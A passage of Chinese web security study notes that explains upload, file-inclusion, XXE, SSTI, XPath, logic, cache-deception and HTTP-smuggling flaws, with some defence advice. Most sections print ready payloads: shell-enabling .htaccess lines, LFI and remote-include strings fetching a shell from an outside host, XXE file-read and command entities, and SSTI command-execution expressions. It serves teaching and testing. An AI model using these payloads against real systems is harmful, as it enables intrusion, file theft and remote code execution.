在php执行的过程中，除了主 `php.ini` 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$\_SERVER\['DOCUMENT\_ROOT'\] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。`.user.ini` 中可以定义除了PHP\_INI\_SYSTEM以外的模式的选项，故可以使用 `.user.ini` 加上非php后缀的文件构造一个shell，比如 `auto_prepend_file=01.gif` 。

#### 4.8.1.6. WAF绕过

有的waf在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。

另外，Waf和Web系统对 `boundary` 的处理不一致，可以使用错误的 `boundary` 来完成绕过。

#### 4.8.1.7. 竞争上传绕过

有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。

### 4.8.2. 攻击技巧

#### 4.8.2.1. Apache重写GetShell

Apache可根据是否允许重定向考虑上传.htaccess

内容为

```
AddType application/x-httpd-php .png
php_flag engine 1
```

就可以用png或者其他后缀的文件做php脚本了

#### 4.8.2.2. 软链接任意读文件

上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件，若服务器没有做好防护，可实现任意文件读取的效果

### 4.8.3. 防护技巧

- 使用白名单限制上传文件的类型
- 使用更严格的文件类型检查方式
- 限制Web Server对上传文件夹的解析

### 4.8.4. 参考链接

- [构造优质上传漏洞Fuzz字典](https://www.freebuf.com/articles/web/188464.html)

---

## [4.9. 文件包含](https://websec.readthedocs.io/zh/latest/vuln/fileinclude.html)

### 4.9.1. 基础

常见的文件包含漏洞的形式为 `<?php include("inc/" . $_GET['file']); ?>`

考虑常用的几种包含方式为

- 同目录包含 `file=.htaccess`
- 目录遍历 `?file=../../../../../../../../../var/lib/locate.db`
- 日志注入 `?file=../../../../../../../../../var/log/apache/error.log`
- 利用 `/proc/self/environ`

其中日志可以使用SSH日志或者Web日志等多种日志来源测试

### 4.9.2. 触发Sink

- **PHP**
  - `include` — 在包含过程中出错会报错，不影响执行后续语句
  - `include_once` — 仅包含一次
  - `require` — 在包含过程中出错，就会直接退出，不执行后续语句
  - `require_once`

### 4.9.3. 绕过技巧

常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式

#### 4.9.3.1. url编码绕过

如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过

#### 4.9.3.2. 特殊字符绕过

- 某些情况下，读文件支持使用Shell通配符，如 `?` `*` 等
- url中使用 `?` `#` 可能会影响include包含的结果
- 某些情况下，unicode编码不同但是字形相近的字符有同一个效果

#### 4.9.3.3. %00截断

几乎是最常用的方法，条件是 `magic_quotes_gpc` 关闭，而且php版本小于5.3.4。

#### 4.9.3.4. 长度截断

Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。

msdn定义 `#define MAX_PATH 260`，其中第260个字符为字符串结尾的 `\0`，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。

- 获取最长文件路径长度：`getconf PATH_MAX /root` 得到4096
- 获取最长文件名：`getconf NAME_MAX /root` 得到255

那么在长度有限的时候，`././././` (n个) 的形式就可以通过这个把路径爆掉。

在php代码包含中，这种绕过方式要求php版本 < php 5.2.8

#### 4.9.3.5. 伪协议绕过

- **远程包含**: 要求 `allow_url_fopen=On` 且 `allow_url_include=On`，payload为 `?file=[http|https|ftp]://websec.wordpress.com/shell.txt` 的形式
- **PHP input**: 把payload放在POST参数中作为包含的文件，要求 `allow_url_include=On`，payload为 `?file=php://input` 的形式
- **Base64**: 使用Base64伪协议读取文件，payload为 `?file=php://filter/convert.base64-encode/resource=index.php` 的形式
- **data**: 使用data伪协议读取文件，payload为 `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=` 的形式，要求 `allow_url_include=On`

#### 4.9.3.6. 协议绕过

`allow_url_fopen` 和 `allow_url_include` 主要是针对 `http` `ftp` 两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。

### 4.9.4. 参考链接

- [Exploit with PHP Protocols](https://www.cdxy.me/?p=752)
- [lfi cheat sheet](https://highon.coffee/blog/lfi-cheat-sheet/)

---

## [4.10. XXE (XML外部实体注入)](https://websec.readthedocs.io/zh/latest/vuln/xxe.html)

### 4.10.1. XML基础

XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。XML 的语法规范由 DTD （Document Type Definition）来进行控制。

### 4.10.2. 基本语法

XML 文档在开头有 `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。

除了可选的开头外，XML 语法主要有以下的特性：

- 所有 XML 元素都须有关闭标签
- XML 标签对大小写敏感
- XML 必须正确地嵌套
- XML 文档必须有根元素
- XML 的属性值需要加引号

另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。

### 4.10.3. XXE

当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。

### 4.10.4. 攻击方式

#### 4.10.4.1. 拒绝服务攻击

```xml
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```

若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。

#### 4.10.4.2. 文件读取

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

#### 4.10.4.3. SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/" [
<!ELEMENT data (#ANY)>
]>
<data>4</data>
```

#### 4.10.4.4. RCE

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <description>&xxe;</description>
   </core>
</catalog>
```

#### 4.10.4.5. XInclude

```xml
<?xml version='1.0'?>
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>
```

### 4.10.5. 参考链接

- [XML教程](http://www.w3school.com.cn/xml/)
- [未知攻焉知防 XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)
- [XXE 攻击笔记分享](http://www.freebuf.com/articles/web/97833.html)
- [从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887)

---

## [4.11. 模版注入 (SSTI)](https://websec.readthedocs.io/zh/latest/vuln/ssti.html)

### 4.11.1. 简介

模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

### 4.11.2. 测试方法

- 确定使用的引擎
- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
- 需找攻击面，尝试攻击

### 4.11.3. 测试用例

- 简单的数学表达式，`{{ 7+7 }} => 14`
- 字符串表达式 `{{ "ajin" }} => ajin`
- Ruby
  - `<%= 7 * 7 %>`
  - `<%= File.open('/etc/passwd').read %>`
- Java
  - `${7*7}`
- Twig
  - `{{7*7}}`
- Smarty
  - `{php}echo \`id\`;{/php}`
- AngularJS
  - `$eval('1+1')`
- Tornado
  - 引用模块 `{% import module %}`
  - `{% import os %}{{ os.popen("whoami").read() }}`
- Flask/Jinja2
  - `{{ config }}`
  - `{{ config.items() }}`
  - `{{get_flashed_messages.__globals__['current_app'].config}}`
  - `{{''.__class__.__mro__[-1].__subclasses__()}}`
  - `{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}`
  - `{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`
- Django
  - `{{ request }}`
  - `{% debug %}`
  - `{% load module %}`
  - `{% include "x.html" %}`
  - `{% extends "x.html" %}`

### 4.11.4. 目标

- 创建对象
- 文件读写
- 远程文件包含
- 信息泄漏
- 提权

### 4.11.5. 相关属性

#### 4.11.5.1. `__class__`

python中的新式类（即显示继承object对象的类）都有一个属性 `__class__` 用于获取当前实例对应的类，例如 `"".__class__` 就可以获取到字符串实例对应的类。

#### 4.11.5.2. `__mro__`

python中类对象的 `__mro__` 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order）寻找的顺序。

#### 4.11.5.3. `__globals__`

保存了函数所有的所有全局变量，在利用中，可以使用 `__init__` 获取对象的函数，并通过 `__globals__` 获取 `file` `os` 等模块以进行下一步的利用。

#### 4.11.5.4. `__subclasses__()`

python的新式类都保留了它所有的子类的引用，`__subclasses__()` 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。

因为python中的类都是继承object的，所以只要调用object类对象的 `__subclasses__()` 方法就可以获取想要的类的对象。

### 4.11.6. 常见Payload

- `().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()`
- `().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )`

### 4.11.7. 绕过技巧

#### 4.11.7.1. 字符串拼接

`request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]`

#### 4.11.7.2. 使用参数绕过

```python
params = {
    'clas': '__class__',
    'mr': '__mro__',
    'subc': '__subclasses__'
}
data = {
    "data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
}
r = requests.post(url, params=params, data=data)
print(r.text)
```

### 4.11.8. 参考链接

- [服务端模版注入](https://zhuanlan.zhihu.com/p/28823933)
- [用Python特性任意代码执行](http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/)

---

## [4.12. Xpath注入](https://websec.readthedocs.io/zh/latest/vuln/xpath.html)

### 4.12.1. Xpath定义

XPath注入攻击是指利用XPath解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。

### 4.12.2. Xpath注入攻击原理

XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。

在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password）两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名（username）和密码（password）的结果来进行授权访问。

例存在user.xml文件如下：

```xml
<users>
     <user>
         <firstname>Ben</firstname>
         <lastname>Elmore</lastname>
         <loginID>abc</loginID>
         <password>test123</password>
     </user>
     <user>
         <firstname>Shlomy</firstname>
         <lastname>Gantz</lastname>
         <loginID>xyz</loginID>
         <password>123test</password>
     </user>
</users>
```

则在XPath中其典型的查询语句为：

```
//users/user[loginID/text()='xyz'and password/text()='123test']
```

但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用户传入一个 login 和 password，例如 `loginID = 'xyz'` 和 `password = '123test'`，则该查询语句将返回 true。但如果用户传入类似 `' or 1=1 or ''='` 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：

```
//users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''='']
```

这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。

---

## [4.13. 逻辑漏洞 / 业务漏洞](https://websec.readthedocs.io/zh/latest/vuln/logic.html)

### 4.13.1. 简介

逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。

在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。

### 4.13.2. 安装逻辑

- 查看能否绕过判定重新安装
- 查看能否利用安装文件获取信息
- 看能否利用更新功能获取信息

### 4.13.3. 交易

#### 4.13.3.1. 购买

- 修改支付的价格
- 修改支付的状态
- 修改购买数量为负数
- 修改金额为负数
- 重放成功的请求
- 并发数据库锁处理不当

#### 4.13.3.2. 业务风控

- 刷优惠券
- 套现

### 4.13.4. 账户

#### 4.13.4.1. 注册

- 覆盖注册
- 尝试重复用户名
- 注册遍历猜解已有账号

#### 4.13.4.2. 密码

- 密码未使用哈希算法保存
- 没有验证用户设置密码的强度

#### 4.13.4.3. 邮箱用户名

- 前后空格
- 大小写变换

#### 4.13.4.4. Cookie

- 包含敏感信息
- 未验证合法性可伪造

#### 4.13.4.5. 手机号用户名

- 前后空格
- +86

#### 4.13.4.6. 登录

- 撞库
  - 设置异地登录检查等机制
- 账号劫持
- 恶意尝试帐号密码锁死账户
  - 需要设置锁定机制与解锁机制
- 不安全的传输信道
- 登录凭证存储在不安全的位置

#### 4.13.4.7. 找回密码

- 重置任意用户密码
- 密码重置后新密码在返回包中
- Token验证逻辑在前端
- X-Forwarded-Host处理不正确
- 找回密码功能泄露用户敏感信息

#### 4.13.4.8. 修改密码

- 越权修改密码
- 修改密码没有旧密码验证

#### 4.13.4.9. 申诉

- 身份伪造
- 逻辑绕过

#### 4.13.4.10. 更新

- ORM更新操作不当可更新任意字段
- 权限限制不当可以越权修改

#### 4.13.4.11. 信息查询

- 权限限制不当可以越权查询
- 用户信息ID可以猜测导致遍历

### 4.13.5. 2FA

- 重置密码后自动登录没有2FA
- OAuth登录没有启用2FA
- 2FA可爆破
- 2FA有条件竞争
- 修改返回值绕过
- 激活链接没有启用2FA
- 可通过CSRF禁用2FA

### 4.13.6. 验证码

- 验证码可重用
- 验证码可预测
- 验证码强度不够
- 验证码无时间限制或者失效时间长
- 验证码无猜测次数限制
- 验证码传递特殊的参数或不传递参数绕过
- 验证码可从返回包中直接获取
- 验证码不刷新或无效
- 验证码数量有限
- 验证码在数据包中返回
- 修改Cookie绕过
- 修改返回包绕过
- 验证码在客户端生成或校验
- 验证码可OCR或使用机器学习识别
- 验证码用于手机短信/邮箱轰炸

### 4.13.7. Session

- Session机制
- Session猜测 / 爆破
- Session伪造
- Session泄漏
- Session Fixation

### 4.13.8. 越权

- 未授权访问
  - 静态文件
  - 通过特定url来防止被访问
- 水平越权
  - 攻击者可以访问与他拥有相同权限的用户的资源
  - 权限类型不变，ID改变
- 垂直越权
  - 低级别攻击者可以访问高级别用户的资源
  - 权限ID不变，类型改变
- 交叉越权
  - 权限ID改变，类型改变

### 4.13.9. 随机数安全

- 使用不安全的随机数发生器
- 使用时间等易猜解的因素作为随机数种子

### 4.13.10. 其他

- 用户/订单/优惠券等ID生成有规律，可枚举
- 接口无权限、次数限制
- 加密算法实现误用
- 执行顺序
- 敏感信息泄露

### 4.13.11. 参考链接

- [水平越权漏洞及其解决方案](http://blog.csdn.net/mylutte/article/details/50819146#10006-weixin-1-52626-6b3bffd01fdde4900130bc5a2751b6d1)
- [细说验证码安全 测试思路大梳理](https://xz.aliyun.com/t/6029)

---

## [4.14. 配置与策略安全](https://websec.readthedocs.io/zh/latest/vuln/config.html)

### 4.14.1. 认证策略

#### 4.14.1.1. 密码策略

- 未限制密码最低位数
- 未限制密码必须包含字符集
- 为常用密码
- 个人信息相关
  - 手机号
  - 生日
  - 姓名
  - 用户名
- 未检测常见弱密码
  - 已泄露的常用密码
  - 键盘模式

#### 4.14.1.2. 加密实现

- 在客户端存储私钥

### 4.14.2. 权限配置

- 运维人员权限粒度过大
- 客服人员权限粒度过大

### 4.14.3. 供应链安全

#### 4.14.3.1. 三方认证

- 利用被攻击的第三方服务账号登录其他平台账号

#### 4.14.3.2. 三方库/软件

- 公开漏洞后没有及时更新

---

## [4.15. 中间件](https://websec.readthedocs.io/zh/latest/vuln/middleware/index.html)

### 4.15.1. IIS

- 4.15.1.1. IIS 6.0
- 4.15.1.2. IIS 7.0-7.5 / Nginx <= 0.8.37
- 4.15.1.3. PUT漏洞
- 4.15.1.4. Windows特性
- 4.15.1.5. 文件名猜解
- 4.15.1.6. 参考链接

### 4.15.2. Apache

- 4.15.2.1. 后缀解析
- 4.15.2.2. .htaccess
- 4.15.2.3. 目录遍历
- 4.15.2.4. CVE-2017-15715
- 4.15.2.5. lighttpd
- 4.15.2.6. 参考链接

### 4.15.3. Nginx

- 4.15.3.1. Fast-CGI关闭
- 4.15.3.2. Fast-CGI开启
- 4.15.3.3. CVE-2013-4547
- 4.15.3.4. 配置错误
- 4.15.3.5. 参考链接

---

## [4.16. Web Cache欺骗攻击](https://websec.readthedocs.io/zh/latest/vuln/webcache.html)

### 4.16.1. 简介

网站通常都会通过如CDN、负载均衡器、或者反向代理来实现Web缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。

例如，网站 `http://www.example.com` 配置了反向代理。对于那些包含用户个人信息的页面，如 `http://www.example.com/home.php` ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如css文件、js文件、txt文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略HTTP缓存头。

Web cache攻击类似于RPO相对路径重写攻击，都依赖于浏览器与服务器对URL的解析方式。当访问不存在的URL时，如 `http://www.example.com/home.php/non-existent.css` ，浏览器发送get请求，依赖于使用的技术与配置，服务器返回了页面 `http://www.example.com/home.php` 的内容，同时URL地址仍然是 `http://www.example.com/home.php/non-existent.css`，http头的内容也与直接访问 `http://www.example.com/home.php` 相同，caching header、content-type（此处为text/html）也相同。

### 4.16.2. 漏洞成因

当代理服务器设置为缓存静态文件并忽略这类文件的caching header时，访问 `http://www.example.com/home.php/no-existent.css` 时，会发生什么呢？整个响应流程如下：

1. 浏览器请求 `http://www.example.com/home.php/non-existent.css`
2. 服务器返回 `http://www.example.com/home.php` 的内容(通常来说不会缓存该页面)
3. 响应经过代理服务器
4. 代理识别该文件有css后缀
5. 在缓存目录下，代理服务器创建目录 `home.php` ，将返回的内容作为 `non-existent.css` 保存

### 4.16.3. 漏洞利用

攻击者欺骗用户访问 `http://www.example.com/home.php/logo.png?www.myhack58.com` ，导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含session标识、安全问题的答案，或者csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。

### 4.16.4. 漏洞存在的条件

漏洞要存在，至少需要满足下面两个条件：

1. web cache功能根据扩展进行保存，并忽略caching header
2. 当访问如 `http://www.example.com/home.php/non-existent.css` 不存在的页面，会返回 `home.php` 的内容

### 4.16.5. 漏洞防御

防御措施主要包括3点：

1. 设置缓存机制，仅仅缓存http caching header允许的文件，这能从根本上杜绝该问题
2. 如果缓存组件提供选项，设置为根据content-type进行缓存
3. 访问 `http://www.example.com/home.php/non-existent.css` 这类不存在页面，不返回 `home.php` 的内容，而返回404或者302

### 4.16.6. Web Cache欺骗攻击实例

#### 4.16.6.1. Paypal

Paypal在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后4位数、交易数据、email地址等信息。受该攻击的部分页面包括：

- `https://www.paypal.com/myaccount/home/attack.css`
- `https://www.paypal.com/myaccount/settings/notifications/attack.css`
- `https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details`

### 4.16.7. 参考链接

- [practical web cache poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)
- [End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks](https://www.usenix.org/conference/usenixsecurity18/presentation/hao)

---

## [4.17. HTTP 请求走私](https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html)

### 4.17.1. 简介

HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术，最早在 2005 年的一篇文章中被提出。

### 4.17.2. 成因

请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 `Content-Length` 和 `Transfer-Encoding` 标头。

### 4.17.3. 分类

- **CLTE**：前端服务器使用 `Content-Length` 头，后端服务器使用 `Transfer-Encoding` 头
- **TECL**：前端服务器使用 `Transfer-Encoding` 标头，后端服务器使用 `Content-Length` 标头。
- **TETE**：前端和后端服务器都支持 `Transfer-Encoding` 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。

### 4.17.4. 攻击

#### 4.17.4.1. CL不为0的GET请求

当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 `Content-Length` 头，不进行处理。例如下面这个例子：

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET /secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

前端服务器处理了 `Content-Length` ，而后端服务器没有处理 `Content-Length` ，基于pipeline机制认为这是两个独立的请求，就造成了漏洞的发生。

#### 4.17.4.2. CL-CL

根据RFC 7230，当服务器收到的请求中包含两个 `Content-Length` ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 `Content-Length` 值时，就会出现漏洞。例如：

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
```

这个例子中a就会被带入下一个请求，变为 `aGET / HTTP/1.1\r\n` 。

#### 4.17.4.3. CL-TE

CL-TE指前端服务器处理 `Content-Length` 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 `Content-Length` ，处理 `Transfer-Encoding` 。例如：

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
```

这个例子中a同样会被带入下一个请求，变为 `aGET / HTTP/1.1\r\n` 。

#### 4.17.4.4. TE-CL

TE-CL指前端服务器处理 `Transfer-Encoding` 请求头，而后端服务器处理 `Content-Length` 请求头。例如：

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

#### 4.17.4.5. TE-TE

TE-TE指前后端服务器都处理 `Transfer-Encoding` 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 `Transfer-encoding` ，测试例如：

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

### 4.17.5. 防御

- 禁用后端连接重用
- 确保连接中的所有服务器具有相同的配置
- 拒绝有二义性的请求

### 4.17.6. 参考链接

#### RFC

- [RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1](https://tools.ietf.org/html/rfc2616)
- [RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1](https://tools.ietf.org/html/rfc7230)

#### Blog / Whitepaper

- [HTTP Request Smuggling by chaiml](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf)
- [HTTP request smuggling by portswigger](https://portswigger.net/web-security/request-smuggling)
- [从一道题到协议层攻击之HTTP请求走私](https://xz.aliyun.com/t/6654)
- [HTTP Request Smuggling in 2020](http://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf)
- [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c)

---

# Web安全学习笔记 - 语言与框架 + 内网渗透 + 云安全

## [5.1. PHP](https://websec.readthedocs.io/zh/latest/language/php/index.html)

内容索引:

* [5.1.1. 后门](https://websec.readthedocs.io/zh/latest/language/php/backdoor.html)
   * [5.1.1.1. php.ini构成的后门](https://websec.readthedocs.io/zh/latest/language/php/backdoor.html#php-ini)
   * [5.1.1.2. .user.ini文件构成的PHP后门](https://websec.readthedocs.io/zh/latest/language/php/backdoor.html#user-iniphp)
* [5.1.2. 反序列化](https://websec.readthedocs.io/zh/latest/language/php/unserialize.html)
   * [5.1.2.1. PHP序列化实现](https://websec.readthedocs.io/zh/latest/language/php/unserialize.html#php)
   * [5.1.2.2. PHP反序列化漏洞](https://websec.readthedocs.io/zh/latest/language/php/unserialize.html#php-1)
   * [5.1.2.3. 利用点](https://websec.readthedocs.io/zh/latest/language/php/unserialize.html#section-4)
   * [5.1.2.4. 相关CVE](https://websec.readthedocs.io/zh/latest/language/php/unserialize.html#cve)
* [5.1.3. Disable Functions](https://websec.readthedocs.io/zh/latest/language/php/disablefunc.html)
   * [5.1.3.1. 机制实现](https://websec.readthedocs.io/zh/latest/language/php/disablefunc.html#section-1)
   * [5.1.3.2. Bypass](https://websec.readthedocs.io/zh/latest/language/php/disablefunc.html#bypass)
* [5.1.4. Open Basedir](https://websec.readthedocs.io/zh/latest/language/php/basedir.html)
   * [5.1.4.1. 机制实现](https://websec.readthedocs.io/zh/latest/language/php/basedir.html#section-1)
* [5.1.5. 安全相关配置](https://websec.readthedocs.io/zh/latest/language/php/config.html)
   * [5.1.5.1. 函数与类限制](https://websec.readthedocs.io/zh/latest/language/php/config.html#section-2)
   * [5.1.5.2. 目录访问限制](https://websec.readthedocs.io/zh/latest/language/php/config.html#section-3)
   * [5.1.5.3. 远程引用限制](https://websec.readthedocs.io/zh/latest/language/php/config.html#section-4)
   * [5.1.5.4. Session](https://websec.readthedocs.io/zh/latest/language/php/config.html#session)
* [5.1.6. PHP流](https://websec.readthedocs.io/zh/latest/language/php/stream.html)
   * [5.1.6.1. 简介](https://websec.readthedocs.io/zh/latest/language/php/stream.html#section-1)
   * [5.1.6.2. 封装协议](https://websec.readthedocs.io/zh/latest/language/php/stream.html#section-2)
   * [5.1.6.3. PHP支持流](https://websec.readthedocs.io/zh/latest/language/php/stream.html#php-1)
   * [5.1.6.4. filter](https://websec.readthedocs.io/zh/latest/language/php/stream.html#filter)
* [5.1.7. htaccess injection payload](https://websec.readthedocs.io/zh/latest/language/php/htaccess.html)
   * [5.1.7.1. file inclusion](https://websec.readthedocs.io/zh/latest/language/php/htaccess.html#file-inclusion)
   * [5.1.7.2. code execution](https://websec.readthedocs.io/zh/latest/language/php/htaccess.html#code-execution)
   * [5.1.7.3. file inclusion](https://websec.readthedocs.io/zh/latest/language/php/htaccess.html#file-inclusion-1)
   * [5.1.7.4. code execution with UTF-7](https://websec.readthedocs.io/zh/latest/language/php/htaccess.html#code-execution-with-utf-7)
   * [5.1.7.5. Source code disclosure](https://websec.readthedocs.io/zh/latest/language/php/htaccess.html#source-code-disclosure)
* [5.1.8. WebShell](https://websec.readthedocs.io/zh/latest/language/php/webshell.html)
   * [5.1.8.1. 常见变形](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#section-1)
   * [5.1.8.2. Bypass](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#bypass)
   * [5.1.8.3. 字符串变形函数](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#section-2)
   * [5.1.8.4. 回调函数](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#section-3)
   * [5.1.8.5. 加解密函数](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#section-4)
   * [5.1.8.6. 其他执行方式](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#section-5)
   * [5.1.8.7. 自定义函数](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#section-6)
   * [5.1.8.8. 特殊字符Shell](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#shell)
   * [5.1.8.9. 检测对抗](https://websec.readthedocs.io/zh/latest/language/php/webshell.html#section-7)
* [5.1.9. 代码混淆](https://websec.readthedocs.io/zh/latest/language/php/obfuscate.html)
* [5.1.10. Phar](https://websec.readthedocs.io/zh/latest/language/php/phar.html)
   * [5.1.10.1. 简介](https://websec.readthedocs.io/zh/latest/language/php/phar.html#section-1)
   * [5.1.10.2. Phar文件结构](https://websec.readthedocs.io/zh/latest/language/php/phar.html#phar-1)
   * [5.1.10.3. 原理](https://websec.readthedocs.io/zh/latest/language/php/phar.html#section-2)
* [5.1.11. Sink](https://websec.readthedocs.io/zh/latest/language/php/sink.html)
   * [5.1.11.1. 任意代码执行](https://websec.readthedocs.io/zh/latest/language/php/sink.html#section-1)
   * [5.1.11.2. 执行系统命令](https://websec.readthedocs.io/zh/latest/language/php/sink.html#section-2)
   * [5.1.11.3. Magic函数](https://websec.readthedocs.io/zh/latest/language/php/sink.html#magic)
   * [5.1.11.4. 文件相关敏感函数](https://websec.readthedocs.io/zh/latest/language/php/sink.html#section-3)
   * [5.1.11.5. SSRF](https://websec.readthedocs.io/zh/latest/language/php/sink.html#ssrf)
